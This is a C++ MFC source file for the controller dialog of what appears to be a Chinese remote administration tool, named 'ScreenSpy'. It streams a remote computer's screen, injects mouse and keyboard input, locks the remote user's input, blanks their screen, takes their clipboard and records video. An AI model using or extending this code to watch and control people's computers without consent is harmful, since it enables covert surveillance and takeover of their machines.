// ScreenSpyDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "DifScreenSpyDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
/////////////////////////////////////////////////////////////////////////////
// CDifScreenSpyDlg dialog
enum
{
	IDM_CONTROL = 0x0010,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_BLANK_SCREEN,	// 黑屏
	IDM_CAPTURE_LAYER,	// 捕捉层
	IDM_SAVEDIB,		// 保存图片
	IDM_SAVEAVI_S,      // 保存录像
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
	IDM_DEEP_1,			// 屏幕色彩深度.....
	IDM_DEEP_4_GRAY,
	IDM_DEEP_4_COLOR,
	IDM_DEEP_8_GRAY,
	IDM_DEEP_8_COLOR,
	IDM_DEEP_16,
	IDM_DEEP_32,

	IDM_FPS_1,		
	IDM_FPS_5,		
	IDM_FPS_10,		
	IDM_FPS_15,		
	IDM_FPS_20,		
	IDM_FPS_25,		
	IDM_FPS_30,		
};




CDifScreenSpyDlg::CDifScreenSpyDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CDifScreenSpyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CDifScreenSpyDlg)
	// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bIsFirst = true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpScreenDIB = NULL;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SCREENSYP));
	m_IPAddress = m_pContext->szAddress;
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	m_bIsCtrl = false; // 默认不控制
	m_bCursorIndex = 1;
	m_bOnClose = FALSE;
	m_nCount=0;
	m_nCountHeart = 0;
	pDeCompressionData = NULL;
	m_MYtagMSG = new MYtagMSG;
	m_MYtagMSGsize = sizeof(MYtagMSG);
	//InitializeCriticalSection(&m_cs);
}

void CDifScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDifScreenSpyDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDifScreenSpyDlg, CDialog)
	//{{AFX_MSG_MAP(CDifScreenSpyDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_SIZE()
	ON_WM_PAINT()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDifScreenSpyDlg message handlers
void CDifScreenSpyDlg::OnCancel()
{
	// TODO: Add your message handler code here and/or call default
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	Sleep(200);
	if (!m_aviFile.IsEmpty())
	{
		KillTimer(132);
		m_aviFile = "";
		m_aviStream.Close();
	}
	::ReleaseDC(m_hWnd, m_hDC);
	DeleteDC(m_hMemDC);
	DeleteObject(m_hFullBitmap);
	//DeleteCriticalSection(&m_cs);
	DestroyIcon(m_hIcon);
	SAFE_DELETE_AR(pDeCompressionData);
	if (m_lpbmi)
		SAFE_DELETE_AR(m_lpbmi);
	if (m_lpbmi_rect)
		SAFE_DELETE_AR(m_lpbmi_rect);
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));
	m_bIsCtrl = false;
	m_bOnClose = TRUE;
	SAFE_DELETE(m_MYtagMSG);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}

void CDifScreenSpyDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN_DIF:
	{
		m_bIsFirst = false;
		DWORD nUnCompressLength = 0;
		memcpy(&nUnCompressLength, m_pContext->m_DeCompressionBuffer.GetBuffer(1), 4);
		nUnCompressLength_old = nUnCompressLength;
		try {
			SAFE_DELETE_AR(pDeCompressionData);
			pDeCompressionData = new BYTE[nUnCompressLength];
		}
		catch (bad_alloc&) {
			PostMessage(WM_CLOSE);
			return;
		}
		DWORD	destLen = nUnCompressLength;
		if (uncompress((byte*)m_lpScreenDIB, &destLen, m_pContext->m_DeCompressionBuffer.GetBuffer() + 5, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5) != Z_OK)
		{
			return;
		}

	}
	break;
	case TOKEN_NEXTSCREEN_DIF:
	{
		DWORD nUnCompressLength = 0;
		memcpy(&nUnCompressLength, m_pContext->m_DeCompressionBuffer.GetBuffer(1), 4);
		if (nUnCompressLength > nUnCompressLength_old) return;
		DWORD	destLen = nUnCompressLength;
		if (uncompress(pDeCompressionData, &destLen, m_pContext->m_DeCompressionBuffer.GetBuffer() + 5, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5) == Z_OK)
		{
			DrawNextScreenDiff(pDeCompressionData, destLen);
		}
		else
		{
			PostMessage(WM_CLOSE);
			return;
		}
	}
	break;
	case TOKEN_BITMAPINFO_DIF:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT_DIF:
		UpdateLocalClipboard((char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	case TOKEN_SIZE_DIF:
		memcpy(&m_rect, m_pContext->m_DeCompressionBuffer.GetBuffer() + 1, sizeof(RECT));
		return;
	default:
		TRACE("%s default error\r\n", __FUNCTION__);
		return;
	}
}

void CDifScreenSpyDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("差异屏幕监控 \\\\ %s %d * %d 第%d帧  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}


bool CDifScreenSpyDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if (dlg.DoModal() != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox(_T("文件保存失败"));
		return false;
	}
	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	// Fill in the fields of the file header
	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
	return true;
}


void CDifScreenSpyDlg::SendResetScreen(int	nBitCount)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET_DIF;
	bBuff[1] = nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}

void CDifScreenSpyDlg::SendResetScreenFps(int	nfps)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_FPS_DIF;
	bBuff[1] = nfps;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}



BOOL CDifScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	// Set the icon for this dialog.  The framework does this automatically
	// when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, _T("跟踪服务端鼠标(&T)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, _T("锁定服务端鼠标和键盘(&L)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, _T("服务端黑屏(&B)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, _T("捕捉层(导致鼠标闪烁)(&L)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("保存录像—必须安装Xvid录制视频解码器(&A)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1, _T("1 位黑白(&A)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY, _T("4 位灰度(&B)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, _T("4 位彩色(&C)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY, _T("8 位灰度(&D)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, _T("8 位彩色(&E)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_16, _T("16位高彩(&F)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, _T("32位真彩(&G)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);

		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_1, _T("FPS-1"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_5, _T("FPS-5"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_10, _T("FPS-10"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_15, _T("FPS-15"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_20, _T("FPS-20"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_25, _T("FPS-25"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_30, _T("FPS-30"));

		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_8_GRAY, MF_BYCOMMAND);

		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, IDM_FPS_1, MF_BYCOMMAND);
	}
	// TODO: Add extra initialization here

	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;
	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;
	// 初始化窗口大小结构
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);
	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
	GetClientRect(&rect);
	ScreenToClient(rect);
	m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
	m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));

	BYTE	bBuff = COMMAND_NEXT_DIF;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}



void CDifScreenSpyDlg::ResetScreen()
{
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
		//	int	nOldWidth = m_lpbmi->bmiHeader.biWidth;
		//	int	nOldHeight = m_lpbmi->bmiHeader.biHeight;
		SAFE_DELETE_AR(m_lpbmi);
		SAFE_DELETE_AR(m_lpbmi_rect);
		m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
		m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		DeleteObject(m_hFullBitmap);
		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
		SelectObject(m_hMemDC, m_hFullBitmap);
		SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
		SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
		// 分辨率发生改变
	//	if (nOldWidth != m_lpbmi->bmiHeader.biWidth || nOldHeight != m_lpbmi->bmiHeader.biHeight)
		//{
		GetClientRect(&rect);
		ScreenToClient(rect);
		m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
		m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
		//}
	}
}



void CDifScreenSpyDlg::DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned long	destLen)
{
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = sizeof(POINT) + sizeof(BYTE); // 标识 + 光标位置 + 光标类型索引
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = pDeCompressionData + nHeadLength;
	DWORD	dwBytes = destLen - nHeadLength;
	POINT	oldPoint;
	memcpy(&oldPoint, &m_RemoteCursorPos, sizeof(POINT));
	memcpy(&m_RemoteCursorPos, pDeCompressionData, sizeof(POINT));
	// 鼠标移动了
	if (memcmp(&oldPoint, &m_RemoteCursorPos, sizeof(POINT)) != 0)
		bIsReDraw = true;
	// 光标类型发生变化
	int	nOldCursorIndex = m_bCursorIndex;
	LPBYTE lpNextCursorIndex = (LPBYTE)(pDeCompressionData + 8);
	if (*lpNextCursorIndex != m_bCursorIndex)
	{
		m_bCursorIndex = *lpNextCursorIndex;
		if (m_bIsTraceCursor)
			bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// 屏幕是否变化
	if (dwBytes > 0)
		bIsReDraw = true;
	//EnterCriticalSection(&m_cs);
	///m_clcs.lock();
	__asm
	{
		mov ebx, [dwBytes]
		mov esi, [lpNextScreen]
		jmp	CopyEnd
		CopyNextBlock :
		mov edi, [lpFirstScreen]
			lodsd	// 把lpNextScreen的第一个双字节，放到eax中,就是DIB中改变区域的偏移
			add edi, eax	// lpFirstScreen偏移eax	
			lodsd // 把lpNextScreen的下一个双字节，放到eax中, 就是改变区域的大小
			mov ecx, eax
			sub ebx, 8 // ebx 减去 两个dword
			sub ebx, ecx // ebx 减去DIB数据的大小
			rep movsb
			CopyEnd :
		cmp ebx, 0 // 是否写入完毕
			jnz CopyNextBlock
	}
	//LeaveCriticalSection(&m_cs);
	//m_clcs.unlock();
	if (bIsReDraw)
	{
#if _DEBUG
		DoPaint();
#else
		//PostMessage(WM_PAINT);
		DoPaint();
#endif
	}


}



void CDifScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (!IsWindowVisible())
		return;

	GetClientRect(&rect);
	ScreenToClient(rect);
	if (!m_bIsFirst)
	{
		m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
		m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
	}
}

void  CDifScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case SC_MAXIMIZE:
		OnNcLButtonDblClk(HTCAPTION, NULL);
		return;
	case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
		return;
	case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
		return;
	case IDM_CONTROL:
	{
		m_bIsCtrl = !m_bIsCtrl;
		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

		if (m_bIsCtrl)
		{
			if (m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
		}
		else
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	}
	break;
	case IDM_TRACE_CURSOR: // 跟踪服务端鼠标
	{
		m_bIsTraceCursor = !m_bIsTraceCursor;
		pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
		if (m_bIsCtrl)
		{
			if (!m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
		}
		// 重绘消除或显示鼠标
		PostMessage(WM_PAINT);
	}
	break;
	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLOCK_INPUT_DIF;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_BLANK_SCREEN: // 服务端黑屏
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLANK_DIF;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_CAPTURE_LAYER: // 捕捉层
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER_DIF;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI_S:
	{

		if (pSysMenu->GetMenuState(IDM_SAVEAVI_S, MF_BYCOMMAND) & MF_CHECKED)
		{
			KillTimer(132);
			pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_UNCHECKED);
			m_aviFile = "";
			m_aviStream.Close();

			return;
		}

		if (m_lpbmi->bmiHeader.biBitCount <= 15)
		{
			AfxMessageBox(_T("不支持16位及以下颜色录像"));
			return;
		}

		CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
		CFileDialog dlg(FALSE, _T("avi"), strFileName, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
		if (dlg.DoModal() != IDOK)
			return;

		m_aviFile = dlg.GetPathName();


		if (!m_aviStream.Open(m_hWnd, m_aviFile, m_lpbmi))
		{
			m_aviFile = _T("");
			MessageBox(_T("Create Video(*.avi) Failed"));
		}
		else
		{
			::SetTimer(m_hWnd, 132, 250, NULL);
			pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_CHECKED);
		}


	}
	break;
	case IDM_GET_CLIPBOARD: // 获取剪贴板
	{
		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD_DIF;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_SET_CLIPBOARD: // 设置剪贴板
	{
		SendLocalClipboard();
	}
	break;
	case IDM_DEEP_1:
	{
		SendResetScreen(1);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_1, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_4_GRAY:
	{
		SendResetScreen(3);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_GRAY, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_4_COLOR:
	{
		SendResetScreen(4);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_COLOR, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_8_GRAY:
	{
		SendResetScreen(7);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_GRAY, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_8_COLOR:
	{
		SendResetScreen(8);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_16:
	{
		SendResetScreen(16);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_16, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_32:
	{
		SendResetScreen(32);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
	}
	break;
	case IDM_FPS_1:
		SendResetScreenFps(1);
		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, nID, MF_BYCOMMAND);
		break;
	case IDM_FPS_5:
	case IDM_FPS_10:
	case IDM_FPS_15:
	case IDM_FPS_20	:
	case IDM_FPS_25:
	case IDM_FPS_30:
	{
		SendResetScreenFps((nID - IDM_DEEP_32) * 5);
		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, nID, MF_BYCOMMAND);
	}
	break;

	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}


void CDifScreenSpyDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);
	COLORREF oldbgcol = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText(m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);
	/*	InvalidateRect(NULL, FALSE);*/
}




BOOL CDifScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{

	switch (pMsg->message)
	{
	case WM_MOUSEMOVE:
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEWHEEL:
	{
		if (!m_bIsCtrl) 	return TRUE;
		m_MYtagMSG->message = pMsg->message;
		m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + m_rect.left);
		m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + m_rect.top);
		m_MYtagMSG->wParam = pMsg->wParam;
		LPBYTE lpData = new BYTE[m_MYtagMSGsize + 1];
		lpData[0] = COMMAND_SCREEN_CONTROL_DIF;
		memcpy(lpData + 1, m_MYtagMSG, m_MYtagMSGsize);
		m_iocpServer->Send(m_pContext, lpData, m_MYtagMSGsize + 1);
		SAFE_DELETE_AR(lpData)

	}
	break;
	case WM_KEYDOWN:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL) & 0x8000 && GetKeyState(VK_MENU) & 0x8000)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			return TRUE;
		}

	case WM_KEYUP:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL) & 0x8000 && GetKeyState(VK_MENU) & 0x8000)
		{
			return TRUE;
		}
	case WM_SYSKEYUP:
	case WM_SYSKEYDOWN:
		if (pMsg->wParam != VK_SCROLL)
		{
			if (!m_bIsCtrl) 	return TRUE;
			m_MYtagMSG->message = pMsg->message;
			m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + m_rect.left);
			m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + m_rect.top);
			m_MYtagMSG->wParam = pMsg->wParam;
			LPBYTE lpData = new BYTE[m_MYtagMSGsize + 1];
			lpData[0] = COMMAND_SCREEN_CONTROL_DIF;
			memcpy(lpData + 1, m_MYtagMSG, m_MYtagMSGsize);
			m_iocpServer->Send(m_pContext, lpData, m_MYtagMSGsize + 1);
			SAFE_DELETE_AR(lpData)
				if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_F4)
					return TRUE;
		}
		if (pMsg->wParam == VK_SCROLL)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			else ClipCursor(NULL);
		}
		if (pMsg->wParam == VK_SPACE)
		{
			return TRUE;
		}

		break;
	default:
		break;
	}

	return CDialog::PreTranslateMessage(pMsg);
}


void CDifScreenSpyDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
	{
		return;
	}

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL_DIF;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	SAFE_DELETE_AR(lpData);
}



void CDifScreenSpyDlg::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(m_hWnd))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len + 10);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CDifScreenSpyDlg::SendLocalClipboard()
{
	if (!::OpenClipboard(m_hWnd))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 2;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD_DIF;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	SAFE_DELETE_AR(lpData);
}


